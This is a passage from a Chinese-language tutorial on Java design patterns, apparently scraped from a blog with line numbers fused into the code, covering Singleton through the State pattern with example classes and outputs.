    <content type="text"><![CDATA[一、概述 二、创建型 1. 单例（Singleton） 2. 简单工厂（Simple Factory） 3. 工厂方法（Factory Method） 4. 抽象工厂（Abstract Factory） 5. 生成器（Builder） 6. 原型模式（Prototype） 三、行为型 1. 责任链（Chain Of Responsibility） 2. 命令（Command） 3. 解释器（Interpreter） 4. 迭代器（Iterator） 5. 中介者（Mediator） 6. 备忘录（Memento） 7. 观察者（Observer） 8. 状态（State） 9. 策略（Strategy） 10. 模板方法（Template Method） 11. 访问者（Visitor） 12. 空对象（Null） 四、结构型 1. 适配器（Adapter） 2. 桥接（Bridge） 3. 组合（Composite） 4. 装饰（Decorator） 5. 外观（Facade） 6. 享元（Flyweight） 7. 代理（Proxy） 参考资料 一、概述设计模式是解决问题的方案，学习现有的设计模式可以做到经验复用。 拥有设计模式词汇，在沟通时就能用更少的词汇来讨论，并且不需要了解底层细节。 源码以及 UML 图 二、创建型1. 单例（Singleton）意图确保一个类只有一个实例，并提供该实例的全局访问点。 类图使用一个私有构造函数、一个私有静态变量以及一个公有静态函数来实现。 私有构造函数保证了不能通过构造函数来创建对象实例，只能通过公有静态函数返回唯一的私有静态变量。 实现（一）懒汉式-线程不安全 以下实现中，私有静态变量 uniqueInstance 被延迟化实例化，这样做的好处是，如果没有用到该类，那么就不会实例化 uniqueInstance，从而节约资源。 这个实现在多线程环境下是不安全的，如果多个线程能够同时进入 if (uniqueInstance == null) ，并且此时 uniqueInstance 为 null，那么多个线程会执行 uniqueInstance = new Singleton(); 语句，这将导致多次实例化 uniqueInstance。 1234567891011121314public class Singleton &#123; private static Singleton uniqueInstance; private Singleton() &#123; &#125; public static Singleton getUniqueInstance() &#123; if (uniqueInstance == null) &#123; uniqueInstance = new Singleton(); &#125; return uniqueInstance; &#125;&#125; （二）懒汉式-线程安全 只需要对 getUniqueInstance() 方法加锁，那么在一个时间点只能有一个线程能够进入该方法，从而避免了对 uniqueInstance 进行多次实例化的问题。 但是这样有一个问题，就是当一个线程进入该方法之后，其它线程试图进入该方法都必须等待，因此性能上有一定的损耗。 123456public static synchronized Singleton getUniqueInstance() &#123; if (uniqueInstance == null) &#123; uniqueInstance = new Singleton(); &#125; return uniqueInstance;&#125; （三）饿汉式-线程安全 线程不安全问题主要是由于 uniqueInstance 被实例化了多次，如果 uniqueInstance 采用直接实例化的话，就不会被实例化多次，也就不会产生线程不安全问题。但是直接实例化的方式也丢失了延迟实例化带来的节约资源的优势。 1private static Singleton uniqueInstance = new Singleton(); （四）双重校验锁-线程安全 uniqueInstance 只需要被实例化一次，之后就可以直接使用了。加锁操作只需要对实例化那部分的代码进行。也就是说，只有当 uniqueInstance 没有被实例化时，才需要进行加锁。 双重校验锁先判断 uniqueInstance 是否已经被实例化，如果没有被实例化，那么才对实例化语句进行加锁。 123456789101112131415161718public class Singleton &#123; private volatile static Singleton uniqueInstance; private Singleton() &#123; &#125; public static Singleton getUniqueInstance() &#123; if (uniqueInstance == null) &#123; synchronized (Singleton.class) &#123; if (uniqueInstance == null) &#123; uniqueInstance = new Singleton(); &#125; &#125; &#125; return uniqueInstance; &#125;&#125; 考虑下面的实现，也就是只使用了一个 if 语句。在 uniqueInstance == null 的情况下，如果两个线程同时执行 if 语句，那么两个线程就会同时进入 if 语句块内。虽然在 if 语句块内有加锁操作，但是两个线程都会执行 uniqueInstance = new Singleton(); 这条语句，只是先后的问题，也就是说会进行两次实例化，从而产生了两个实例。因此必须使用双重校验锁，也就是需要使用两个 if 语句。 12345if (uniqueInstance == null) &#123; synchronized (Singleton.class) &#123; uniqueInstance = new Singleton(); &#125;&#125; uniqueInstance 采用 volatile 关键字修饰也是很有必要的。uniqueInstance = new Singleton(); 这段代码其实是分为三步执行。 分配内存空间 初始化对象 将 uniqueInstance 指向分配的内存地址 但是由于 JVM 具有指令重排的特性，有可能执行顺序变为了 1&gt;3&gt;2，这在单线程情况下自然是没有问题。但如果是多线程下，有可能获得是一个还没有被初始化的实例，以致于程序出错。 使用 volatile 可以禁止 JVM 的指令重排，保证在多线程环境下也能正常运行。 （五）枚举实现 这是单例模式的最佳实践，它实现简单，并且在面对复杂的序列化或者反射攻击的时候，能够防止实例化多次。 123public enum Singleton &#123; uniqueInstance;&#125; 考虑以下单例模式的实现，该 Singleton 在每次序列化的时候都会创建一个新的实例，为了保证只创建一个实例，必须声明所有字段都是 transient，并且提供一个 readResolve() 方法。 1234567891011121314public class Singleton implements Serializable &#123; private static Singleton uniqueInstance; private Singleton() &#123; &#125; public static synchronized Singleton getUniqueInstance() &#123; if (uniqueInstance == null) &#123; uniqueInstance = new Singleton(); &#125; return uniqueInstance; &#125;&#125; 如果不使用枚举来实现单例模式，会出现反射攻击，因为通过 setAccessible() 方法可以将私有构造函数的访问级别设置为 public，然后调用构造函数从而实例化对象。如果要防止这种攻击，需要在构造函数中添加防止实例化第二个对象的代码。 从上面的讨论可以看出，解决序列化和反射攻击很麻烦，而枚举实现不会出现这两种问题，所以说枚举实现单例模式是最佳实践。 使用场景 Logger Classes Configuration Classes Accesing resources in shared mode Factories implemented as Singletons JDK java.lang.Runtime#getRuntime() java.awt.Desktop#getDesktop() java.lang.System#getSecurityManager() 2. 简单工厂（Simple Factory）意图在创建一个对象时不向客户暴露内部细节，并提供一个创建对象的通用接口。 类图简单工厂不是设计模式，更像是一种编程习惯。它把实例化的操作单独放到一个类中，这个类就成为简单工厂类，让简单工厂类来决定应该用哪个具体子类来实例化。 这样做能把客户类和具体子类的实现解耦，客户类不再需要知道有哪些子类以及应当实例化哪个子类。因为客户类往往有多个，如果不使用简单工厂，所有的客户类都要知道所有子类的细节。而且一旦子类发生改变，例如增加子类，那么所有的客户类都要进行修改。 如果存在下面这种代码，就需要使用简单工厂将对象实例化的部分放到简单工厂中。 12345678910111213public class Client &#123; public static void main(String[] args) &#123; int type = 1; Product product; if (type == 1) &#123; product = new ConcreteProduct1(); &#125; else if (type == 2) &#123; product = new ConcreteProduct2(); &#125; else &#123; product = new ConcreteProduct(); &#125; &#125;&#125; 实现12public interface Product &#123;&#125; 12public class ConcreteProduct implements Product &#123;&#125; 12public class ConcreteProduct1 implements Product &#123;&#125; 12public class ConcreteProduct2 implements Product &#123;&#125; 12345678910public class SimpleFactory &#123; public Product createProduct(int type) &#123; if (type == 1) &#123; return new ConcreteProduct1(); &#125; else if (type == 2) &#123; return new ConcreteProduct2(); &#125; return new ConcreteProduct(); &#125;&#125; 123456public class Client &#123; public static void main(String[] args) &#123; SimpleFactory simpleFactory = new SimpleFactory(); Product product = simpleFactory.createProduct(1); &#125;&#125; 3. 工厂方法（Factory Method）意图定义了一个创建对象的接口，但由子类决定要实例化哪个类。工厂方法把实例化推迟到子类。 类图在简单工厂中，创建对象的是另一个类，而在工厂方法中，是由子类来创建对象。 下图中，Factory 有一个 doSomething() 方法，这个方法需要用到一个产品对象，这个产品对象由 factoryMethod() 方法创建。该方法是抽象的，需要由子类去实现。 实现1234567public abstract class Factory &#123; abstract public Product factoryMethod(); public void doSomething() &#123; Product product = factoryMethod(); // do something with the product &#125;&#125; 12345public class ConcreteFactory extends Factory &#123; public Product factoryMethod() &#123; return new ConcreteProduct(); &#125;&#125; 12345public class ConcreteFactory1 extends Factory &#123; public Product factoryMethod() &#123; return new ConcreteProduct1(); &#125;&#125; 12345public class ConcreteFactory2 extends Factory &#123; public Product factoryMethod() &#123; return new ConcreteProduct2(); &#125;&#125; JDK java.util.Calendar java.util.ResourceBundle java.text.NumberFormat java.nio.charset.Charset java.net.URLStreamHandlerFactory java.util.EnumSet javax.xml.bind.JAXBContext 4. 抽象工厂（Abstract Factory）意图提供一个接口，用于创建 相关的对象家族 。 类图抽象工厂模式创建的是对象家族，也就是很多对象而不是一个对象，并且这些对象是相关的，也就是说必须一起创建出来。而工厂方法模式只是用于创建一个对象，这和抽象工厂模式有很大不同。 抽象工厂模式用到了工厂方法模式来创建单一对象，AbstractFactory 中的 createProductA() 和 createProductB() 方法都是让子类来实现，这两个方法单独来看就是在创建一个对象，这符合工厂方法模式的定义。 至于创建对象的家族这一概念是在 Client 体现，Client 要通过 AbstractFactory 同时调用两个方法来创建出两个对象，在这里这两个对象就有很大的相关性，Client 需要同时创建出这两个对象。 从高层次来看，抽象工厂使用了组合，即 Cilent 组合了 AbstractFactory，而工厂方法模式使用了继承。 代码实现12public class AbstractProductA &#123;&#125; 12public class AbstractProductB &#123;&#125; 12public class ProductA1 extends AbstractProductA &#123;&#125; 12public class ProductA2 extends AbstractProductA &#123;&#125; 12public class ProductB1 extends AbstractProductB &#123;&#125; 12public class ProductB2 extends AbstractProductB &#123;&#125; 1234public abstract class AbstractFactory &#123; abstract AbstractProductA createProductA(); abstract AbstractProductB createProductB();&#125; 123456789public class ConcreteFactory1 extends AbstractFactory &#123; AbstractProductA createProductA() &#123; return new ProductA1(); &#125; AbstractProductB createProductB() &#123; return new ProductB1(); &#125;&#125; 123456789public class ConcreteFactory2 extends AbstractFactory &#123; AbstractProductA createProductA() &#123; return new ProductA2(); &#125; AbstractProductB createProductB() &#123; return new ProductB2(); &#125;&#125; 12345678public class Client &#123; public static void main(String[] args) &#123; AbstractFactory abstractFactory = new ConcreteFactory1(); AbstractProductA productA = abstractFactory.createProductA(); AbstractProductB productB = abstractFactory.createProductB(); // do something with productA and productB &#125;&#125; JDK javax.xml.parsers.DocumentBuilderFactory javax.xml.transform.TransformerFactory javax.xml.xpath.XPathFactory 5. 生成器（Builder）意图封装一个对象的构造过程，并允许按步骤构造。 类图 实现以下是一个简易的 StringBuilder 实现，参考了 JDK 1.8 源码。 12345678910111213141516171819202122232425262728293031323334public class AbstractStringBuilder &#123; protected char[] value; protected int count; public AbstractStringBuilder(int capacity) &#123; count = 0; value = new char[capacity]; &#125; public AbstractStringBuilder append(char c) &#123; ensureCapacityInternal(count + 1); value[count++] = c; return this; &#125; private void ensureCapacityInternal(int minimumCapacity) &#123; // overflow-conscious code if (minimumCapacity - value.length &gt; 0) expandCapacity(minimumCapacity); &#125; void expandCapacity(int minimumCapacity) &#123; int newCapacity = value.length * 2 + 2; if (newCapacity - minimumCapacity &lt; 0) newCapacity = minimumCapacity; if (newCapacity &lt; 0) &#123; if (minimumCapacity &lt; 0) // overflow throw new OutOfMemoryError(); newCapacity = Integer.MAX_VALUE; &#125; value = Arrays.copyOf(value, newCapacity); &#125;&#125; 1234567891011public class StringBuilder extends AbstractStringBuilder &#123; public StringBuilder() &#123; super(16); &#125; @Override public String toString() &#123; // Create a copy, don't share the array return new String(value, 0, count); &#125;&#125; 12345678910public class Client &#123; public static void main(String[] args) &#123; StringBuilder sb = new StringBuilder(); final int count = 26; for (int i = 0; i &lt; count; i++) &#123; sb.append((char) ('a' + i)); &#125; System.out.println(sb.toString()); &#125;&#125; 1abcdefghijklmnopqrstuvwxyz JDK java.lang.StringBuilder java.nio.ByteBuffer java.lang.StringBuffer java.lang.Appendable Apache Camel builders 6. 原型模式（Prototype）意图使用原型实例指定要创建对象的类型，通过复制这个原型来创建新对象。 类图 实现123public abstract class Prototype &#123; abstract Prototype myClone();&#125; 123456789101112131415161718public class ConcretePrototype extends Prototype &#123; private String filed; public ConcretePrototype(String filed) &#123; this.filed = filed; &#125; @Override Prototype myClone() &#123; return new ConcretePrototype(filed); &#125; @Override public String toString() &#123; return filed; &#125;&#125; 1234567public class Client &#123; public static void main(String[] args) &#123; Prototype prototype = new ConcretePrototype("abc"); Prototype clone = prototype.myClone(); System.out.println(clone.toString()); &#125;&#125; 1abc JDK java.lang.Object#clone() 三、行为型1. 责任链（Chain Of Responsibility）意图使多个对象都有机会处理请求，从而避免请求的发送者和接收者之间的耦合关系。将这些对象连成一条链，并沿着这条链发送该请求，直到有一个对象处理它为止。 类图 Handler：定义处理请求的接口，并且实现后继链（successor） 实现123456789public abstract class Handler &#123; protected Handler successor; public Handler(Handler successor) &#123; this.successor = successor; &#125; protected abstract void handleRequest(Request request);&#125; 12345678910111213141516public class ConcreteHandler1 extends Handler &#123; public ConcreteHandler1(Handler successor) &#123; super(successor); &#125; @Override protected void handleRequest(Request request) &#123; if (request.getType() == RequestType.type1) &#123; System.out.println(request.getName() + " is handle by ConcreteHandler1"); return; &#125; if (successor != null) &#123; successor.handleRequest(request); &#125; &#125;&#125; 12345678910111213141516public class ConcreteHandler2 extends Handler&#123; public ConcreteHandler2(Handler successor) &#123; super(successor); &#125; @Override protected void handleRequest(Request request) &#123; if (request.getType() == RequestType.type2) &#123; System.out.println(request.getName() + " is handle by ConcreteHandler2"); return; &#125; if (successor != null) &#123; successor.handleRequest(request); &#125; &#125;&#125; 1234567891011121314151617public class Request &#123; private RequestType type; private String name; public Request(RequestType type, String name) &#123; this.type = type; this.name = name; &#125; public RequestType getType() &#123; return type; &#125; public String getName() &#123; return name; &#125;&#125; 123public enum RequestType &#123; type1, type2&#125; 12345678910public class Client &#123; public static void main(String[] args) &#123; Handler handler1 = new ConcreteHandler1(null); Handler handler2 = new ConcreteHandler2(handler1); Request request1 = new Request(RequestType.type1, "request1"); handler2.handleRequest(request1); Request request2 = new Request(RequestType.type2, "request2"); handler2.handleRequest(request2); &#125;&#125; 12request1 is handle by ConcreteHandler1request2 is handle by ConcreteHandler2 JDK java.util.logging.Logger#log() Apache Commons Chain javax.servlet.Filter#doFilter() 2. 命令（Command）意图将命令封装成对象中，以便使用命令来参数化其它对象，或者将命令对象放入队列中进行排队，或者将命令对象的操作记录到日志中，以及支持可撤销的操作。 类图 Command：命令 Receiver：命令接收者，也就是命令真正的执行者 Invoker：通过它来调用命令 Client：可以设置命令与命令的接收者 实现设计一个遥控器，可以控制电灯开关。 123public interface Command &#123; void execute();&#125; 123456789101112public class LightOnCommand implements Command &#123; Light light; public LightOnCommand(Light light) &#123; this.light = light; &#125; @Override public void execute() &#123; light.on(); &#125;&#125; 123456789101112public class LightOffCommand implements Command &#123; Light light; public LightOffCommand(Light light) &#123; this.light = light; &#125; @Override public void execute() &#123; light.off(); &#125;&#125; 12345678910public class Light &#123; public void on() &#123; System.out.println("Light is on!"); &#125; public void off() &#123; System.out.println("Light is off!"); &#125;&#125; 1234567891011121314151617181920212223242526272829/** * 遥控器 */public class Invoker &#123; private Command[] onCommands; private Command[] offCommands; private final int slotNum = 7; public Invoker() &#123; this.onCommands = new Command[slotNum]; this.offCommands = new Command[slotNum]; &#125; public void setOnCommand(Command command, int slot) &#123; onCommands[slot] = command; &#125; public void setOffCommand(Command command, int slot) &#123; offCommands[slot] = command; &#125; public void onButtonWasPushed(int slot) &#123; onCommands[slot].execute(); &#125; public void offButtonWasPushed(int slot) &#123; offCommands[slot].execute(); &#125;&#125; 123456789101112public class Client &#123; public static void main(String[] args) &#123; Invoker invoker = new Invoker(); Light light = new Light(); Command lightOnCommand = new LightOnCommand(light); Command lightOffCommand = new LightOffCommand(light); invoker.setOnCommand(lightOnCommand, 0); invoker.setOffCommand(lightOffCommand, 0); invoker.onButtonWasPushed(0); invoker.offButtonWasPushed(0); &#125;&#125; JDK java.lang.Runnable Netflix Hystrix javax.swing.Action 3. 解释器（Interpreter）意图为语言创建解释器，通常由语言的语法和语法分析来定义。 类图 TerminalExpression：终结符表达式，每个终结符都需要一个 TerminalExpression Context：上下文，包含解释器之外的一些全局信息 实现以下是一个规则检验器实现，具有 and 和 or 规则，通过规则可以构建一颗解析树，用来检验一个文本是否满足解析树定义的规则。 例如一颗解析树为 D And (A Or (B C))，文本 “D A” 满足该解析树定义的规则。 这里的 Context 指的是 String。 123public abstract class Expression &#123; public abstract boolean interpret(String str);&#125; 12345678910111213141516171819public class TerminalExpression extends Expression &#123; private String literal = null; public TerminalExpression(String str) &#123; literal = str; &#125; public boolean interpret(String str) &#123; StringTokenizer st = new StringTokenizer(str); while (st.hasMoreTokens()) &#123; String test = st.nextToken(); if (test.equals(literal)) &#123; return true; &#125; &#125; return false; &#125;&#125; 1234567891011121314public class AndExpression extends Expression &#123; private Expression expression1 = null; private Expression expression2 = null; public AndExpression(Expression expression1, Expression expression2) &#123; this.expression1 = expression1; this.expression2 = expression2; &#125; public boolean interpret(String str) &#123; return expression1.interpret(str) &amp;&amp; expression2.interpret(str); &#125;&#125; 12345678910111213public class OrExpression extends Expression &#123; private Expression expression1 = null; private Expression expression2 = null; public OrExpression(Expression expression1, Expression expression2) &#123; this.expression1 = expression1; this.expression2 = expression2; &#125; public boolean interpret(String str) &#123; return expression1.interpret(str) || expression2.interpret(str); &#125;&#125; 123456789101112131415161718192021222324252627public class Client &#123; /** * 构建解析树 */ public static Expression buildInterpreterTree() &#123; // Literal Expression terminal1 = new TerminalExpression("A"); Expression terminal2 = new TerminalExpression("B"); Expression terminal3 = new TerminalExpression("C"); Expression terminal4 = new TerminalExpression("D"); // B C Expression alternation1 = new OrExpression(terminal2, terminal3); // A Or (B C) Expression alternation2 = new OrExpression(terminal1, alternation1); // D And (A Or (B C)) return new AndExpression(terminal4, alternation2); &#125; public static void main(String[] args) &#123; Expression define = buildInterpreterTree(); String context1 = "D A"; String context2 = "A B"; System.out.println(define.interpret(context1)); System.out.println(define.interpret(context2)); &#125;&#125; 12truefalse JDK java.util.Pattern java.text.Normalizer All subclasses of java.text.Format javax.el.ELResolver 4. 迭代器（Iterator）意图提供一种顺序访问聚合对象元素的方法，并且不暴露聚合对象的内部表示。 类图 Aggregate 是聚合类，其中 createIterator() 方法可以产生一个 Iterator； Iterator 主要定义了 hasNext() 和 next() 方法。 Client 组合了 Aggregate，为了迭代遍历 Aggregate，也需要组合 Iterator。 实现123public interface Aggregate &#123; Iterator createIterator();&#125; 12345678910111213141516public class ConcreteAggregate implements Aggregate &#123; private Integer[] items; public ConcreteAggregate() &#123; items = new Integer[10]; for (int i = 0; i &lt; items.length; i++) &#123; items[i] = i; &#125; &#125; @Override public Iterator createIterator() &#123; return new ConcreteIterator&lt;Integer&gt;(items); &#125;&#125; 12345public interface Iterator&lt;Item&gt; &#123; Item next(); boolean hasNext();&#125; 12345678910111213141516171819public class ConcreteIterator&lt;Item&gt; implements Iterator &#123; private Item[] items; private int position = 0; public ConcreteIterator(Item[] items) &#123; this.items = items; &#125; @Override public Object next() &#123; return items[position++]; &#125; @Override public boolean hasNext() &#123; return position &lt; items.length; &#125;&#125; 123456789public class Client &#123; public static void main(String[] args) &#123; Aggregate aggregate = new ConcreteAggregate(); Iterator&lt;Integer&gt; iterator = aggregate.createIterator(); while (iterator.hasNext()) &#123; System.out.println(iterator.next()); &#125; &#125;&#125; JDK java.util.Iterator java.util.Enumeration 5. 中介者（Mediator）意图集中相关对象之间复杂的沟通和控制方式。 类图 Mediator：中介者，定义一个接口用于与各同事（Colleague）对象通信。 Colleague：同事，相关对象 实现Alarm（闹钟）、CoffeePot（咖啡壶）、Calendar（日历）、Sprinkler（喷头）是一组相关的对象，在某个对象的事件产生时需要去操作其它对象，形成了下面这种依赖结构： 使用中介者模式可以将复杂的依赖结构变成星形结构： 123public abstract class Colleague &#123; public abstract void onEvent(Mediator mediator);&#125; 1234567891011public class Alarm extends Colleague &#123; @Override public void onEvent(Mediator mediator) &#123; mediator.doEvent("alarm"); &#125; public void doAlarm() &#123; System.out.println("doAlarm()"); &#125;&#125; 12345678910public class CoffeePot extends Colleague &#123; @Override public void onEvent(Mediator mediator) &#123; mediator.doEvent("coffeePot"); &#125; public void doCoffeePot() &#123; System.out.println("doCoffeePot()"); &#125;&#125; 12345678910public class Calender extends Colleague &#123; @Override public void onEvent(Mediator mediator) &#123; mediator.doEvent("calender"); &#125; public void doCalender() &#123; System.out.println("doCalender()"); &#125;&#125; 12345678910public class Sprinkler extends Colleague &#123; @Override public void onEvent(Mediator mediator) &#123; mediator.doEvent("sprinkler"); &#125; public void doSprinkler() &#123; System.out.println("doSprinkler()"); &#125;&#125; 123public abstract class Mediator &#123; public abstract void doEvent(String eventType);&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849public class ConcreteMediator extends Mediator &#123; private Alarm alarm; private CoffeePot coffeePot; private Calender calender; private Sprinkler sprinkler; public ConcreteMediator(Alarm alarm, CoffeePot coffeePot, Calender calender, Sprinkler sprinkler) &#123; this.alarm = alarm; this.coffeePot = coffeePot; this.calender = calender; this.sprinkler = sprinkler; &#125; @Override public void doEvent(String eventType) &#123; switch (eventType) &#123; case "alarm": doAlarmEvent(); break; case "coffeePot": doCoffeePotEvent(); break; case "calender": doCalenderEvent(); break; default: doSprinklerEvent(); &#125; &#125; public void doAlarmEvent() &#123; alarm.doAlarm(); coffeePot.doCoffeePot(); calender.doCalender(); sprinkler.doSprinkler(); &#125; public void doCoffeePotEvent() &#123; // ... &#125; public void doCalenderEvent() &#123; // ... &#125; public void doSprinklerEvent() &#123; // ... &#125;&#125; 1234567891011public class Client &#123; public static void main(String[] args) &#123; Alarm alarm = new Alarm(); CoffeePot coffeePot = new CoffeePot(); Calender calender = new Calender(); Sprinkler sprinkler = new Sprinkler(); Mediator mediator = new ConcreteMediator(alarm, coffeePot, calender, sprinkler); // 闹钟事件到达，调用中介者就可以操作相关对象 alarm.onEvent(mediator); &#125;&#125; 1234doAlarm()doCoffeePot()doCalender()doSprinkler() JDK All scheduleXXX() methods of java.util.Timer java.util.concurrent.Executor#execute() submit() and invokeXXX() methods of java.util.concurrent.ExecutorService scheduleXXX() methods of java.util.concurrent.ScheduledExecutorService java.lang.reflect.Method#invoke() 6. 备忘录（Memento）意图在不违反封装的情况下获得对象的内部状态，从而在需要时可以将对象恢复到最初状态。 类图 Originator：原始对象 Caretaker：负责保存好备忘录 Menento：备忘录，存储原始对象的的状态。备忘录实际上有两个接口，一个是提供给 Caretaker 的窄接口：它只能将备忘录传递给其它对象；一个是提供给 Originator 的宽接口，允许它访问到先前状态所需的所有数据。理想情况是只允许 Originator 访问本备忘录的内部状态。 实现以下实现了一个简单计算器程序，可以输入两个值，然后计算这两个值的和。备忘录模式允许将这两个值存储起来，然后在某个时刻用存储的状态进行恢复。 实现参考：Memento Pattern - Calculator Example - Java Sourcecode 1234567891011121314151617/** * Originator Interface */public interface Calculator &#123; // Create Memento PreviousCalculationToCareTaker backupLastCalculation(); // setMemento void restorePreviousCalculation(PreviousCalculationToCareTaker memento); int getCalculationResult(); void setFirstNumber(int firstNumber); void setSecondNumber(int secondNumber);&#125; 123456789101112131415161718192021222324252627282930313233343536/** * Originator Implementation */public class CalculatorImp implements Calculator &#123; private int firstNumber; private int secondNumber; @Override public PreviousCalculationToCareTaker backupLastCalculation() &#123; // create a memento object used for restoring two numbers return new PreviousCalculationImp(firstNumber, secondNumber); &#125; @Override public void restorePreviousCalculation(PreviousCalculationToCareTaker memento) &#123; this.firstNumber = ((PreviousCalculationToOriginator) memento).getFirstNumber(); this.secondNumber = ((PreviousCalculationToOriginator) memento).getSecondNumber(); &#125; @Override public int getCalculationResult() &#123; // result is adding two numbers return firstNumber + secondNumber; &#125; @Override public void setFirstNumber(int firstNumber) &#123; this.firstNumber = firstNumber; &#125; @Override public void setSecondNumber(int secondNumber) &#123; this.secondNumber = secondNumber; &#125;&#125; 123456789/** * Memento Interface to Originator * * This interface allows the originator to restore its state */public interface PreviousCalculationToOriginator &#123; int getFirstNumber(); int getSecondNumber();&#125; 123456/** * Memento interface to CalculatorOperator (Caretaker) */public interface PreviousCalculationToCareTaker &#123; // no operations permitted for the caretaker&#125; 1234567891011121314151617181920212223242526/** * Memento Object Implementation * &lt;p&gt; * Note that this object implements both interfaces to Originator and CareTaker */public class PreviousCalculationImp implements PreviousCalculationToCareTaker, PreviousCalculationToOriginator &#123; private int firstNumber; private int secondNumber; public PreviousCalculationImp(int firstNumber, int secondNumber) &#123; this.firstNumber = firstNumber; this.secondNumber = secondNumber; &#125; @Override public int getFirstNumber() &#123; return firstNumber; &#125; @Override public int getSecondNumber() &#123; return secondNumber; &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435/** * CareTaker object */public class Client &#123; public static void main(String[] args) &#123; // program starts Calculator calculator = new CalculatorImp(); // assume user enters two numbers calculator.setFirstNumber(10); calculator.setSecondNumber(100); // find result System.out.println(calculator.getCalculationResult()); // Store result of this calculation in case of error PreviousCalculationToCareTaker memento = calculator.backupLastCalculation(); // user enters a number calculator.setFirstNumber(17); // user enters a wrong second number and calculates result calculator.setSecondNumber(-290); // calculate result System.out.println(calculator.getCalculationResult()); // user hits CTRL + Z to undo last operation and see last result calculator.restorePreviousCalculation(memento); // result restored System.out.println(calculator.getCalculationResult()); &#125;&#125; 123110-273110 JDK java.io.Serializable 7. 观察者（Observer）意图定义对象之间的一对多依赖，当一个对象状态改变时，它的所有依赖都会收到通知并且自动更新状态。 主题（Subject）是被观察的对象，而其所有依赖者（Observer）称为观察者。 类图主题（Subject）具有注册和移除观察者、并通知所有观察者的功能，主题是通过维护一张观察者列表来实现这些操作的。 观察者（Observer）的注册功能需要调用主题的 registerObserver() 方法。 实现天气数据布告板会在天气信息发生改变时更新其内容，布告板有多个，并且在将来会继续增加。 1234567public interface Subject &#123; void resisterObserver(Observer o); void removeObserver(Observer o); void notifyObserver();&#125; 12345678910111213141516171819202122232425262728293031323334353637public class WeatherData implements Subject &#123; private List&lt;Observer&gt; observers; private float temperature; private float humidity; private float pressure; public WeatherData() &#123; observers = new ArrayList&lt;&gt;(); &#125; public void setMeasurements(float temperature, float humidity, float pressure) &#123; this.temperature = temperature; this.humidity = humidity; this.pressure = pressure; notifyObserver(); &#125; @Override public void resisterObserver(Observer o) &#123; observers.add(o); &#125; @Override public void removeObserver(Observer o) &#123; int i = observers.indexOf(o); if (i &gt;= 0) &#123; observers.remove(i); &#125; &#125; @Override public void notifyObserver() &#123; for (Observer o : observers) &#123; o.update(temperature, humidity, pressure); &#125; &#125;&#125; 123public interface Observer &#123; void update(float temp, float humidity, float pressure);&#125; 1234567891011public class StatisticsDisplay implements Observer &#123; public StatisticsDisplay(Subject weatherData) &#123; weatherData.resisterObserver(this); &#125; @Override public void update(float temp, float humidity, float pressure) &#123; System.out.println("StatisticsDisplay.update: " + temp + " " + humidity + " " + pressure); &#125;&#125; 1234567891011public class CurrentConditionsDisplay implements Observer &#123; public CurrentConditionsDisplay(Subject weatherData) &#123; weatherData.resisterObserver(this); &#125; @Override public void update(float temp, float humidity, float pressure) &#123; System.out.println("CurrentConditionsDisplay.update: " + temp + " " + humidity + " " + pressure); &#125;&#125; 12345678910public class WeatherStation &#123; public static void main(String[] args) &#123; WeatherData weatherData = new WeatherData(); CurrentConditionsDisplay currentConditionsDisplay = new CurrentConditionsDisplay(weatherData); StatisticsDisplay statisticsDisplay = new StatisticsDisplay(weatherData); weatherData.setMeasurements(0, 0, 0); weatherData.setMeasurements(1, 1, 1); &#125;&#125; 1234CurrentConditionsDisplay.update: 0.0 0.0 0.0StatisticsDisplay.update: 0.0 0.0 0.0CurrentConditionsDisplay.update: 1.0 1.0 1.0StatisticsDisplay.update: 1.0 1.0 1.0 JDK java.util.Observer java.util.EventListener javax.servlet.http.HttpSessionBindingListener RxJava 8. 状态（State）意图允许对象在内部状态改变时改变它的行为，对象看起来好像修改了它所属的类。 类图 实现糖果销售机有多种状态，每种状态下销售机有不同的行为，状态可以发生转移，使得销售机的行为也发生改变。 123456789101112131415161718192021public interface State &#123; /** * 投入 25 分钱 */ void insertQuarter(); /** * 退回 25 分钱 */ void ejectQuarter(); /** * 转动曲柄 */ void turnCrank(); /** * 发放糖果 */ void dispense();&#125; 123456789101112131415161718192021222324252627282930public class HasQuarterState implements State &#123; private GumballMachine gumballMachine; public HasQuarterState(GumballMachine gumballMachine) &#123; this.gumballMachine = gumballMachine; &#125; @Override public void insertQuarter() &#123; System.out.println("You can't insert another quarter"); &#125; @Override public void ejectQuarter() &#123; System.out.println("Quarter returned"); gumballMachine.setState(gumballMachine.getNoQuarterState()); &#125; @Override public void turnCrank() &#123; System.out.println("You turned..."); gumballMachine.setState(gumballMachine.getSoldState()); &#125; @Override public void dispense() &#123; System.out.println("No gumball dispensed"); &#125;&#125; 1234567891011121314151617181920212223242526272829public class NoQuarterState implements State &#123; GumballMachine gumballMachine; public NoQuarterState(GumballMachine gumballMachine) &#123; this.gumballMachine = gumballMachine; &#125; @Override public void insertQuarter() &#123; System.out.println("You insert a quarter"); gumballMachine.setState(gumballMachine.getHasQuarterState()); &#125; @Override public void ejectQuarter() &#123; System.out.println("You haven't insert a quarter"); &#125; @Override public void turnCrank() &#123; System.out.println("You turned, but there's no quarter"); &#125; @Override public void dispense() &#123; System.out.println("You need to pay first"); &#125;&#125; 12345678910111213141516171819202122232425262728public class SoldOutState implements State &#123; GumballMachine gumballMachine; public SoldOutState(GumballMachine gumballMachine) &#123; this.gumballMachine = gumballMachine; &#125; @Override public void insertQuarter() &#123; System.out.println("You can't insert a quarter, the machine is sold out"); &#125; @Override public void ejectQuarter() &#123; System.out.println("You can't eject, you haven't inserted a quarter yet"); &#125; @Override public void turnCrank() &#123; System.out.println("You turned, but there are no gumballs"); &#125; @Override public void dispense() &#123; System.out.println("No gumball dispensed"); &#125;&#125; 12345678910111213141516171819202122232425262728293031323334public class SoldState implements State &#123; GumballMachine gumballMachine; public SoldState(GumballMachine gumballMachine) &#123; this.gumballMachine = gumballMachine; &#125; @Override public void insertQuarter() &#123; System.out.println("Please wait, we're already giving you a gumball"); &#125; @Override public void ejectQuarter() &#123; System.out.println("Sorry, you already turned the crank"); &#125; @Override public void turnCrank() &#123; System.out.println("Turning twice doesn't get you another gumball!"); &#125; @Override public void dispense() &#123; gumballMachine.releaseBall(); if (gumballMachine.getCount() &gt; 0) &#123; gumballMachine.setState(gumballMachine.getNoQuarterState()); &#125; else &#123; System.out.println("Oops, out of gumballs"); gumballMachine.setState(gumballMachine.getSoldOutState()); &#125; &#125;&#125; 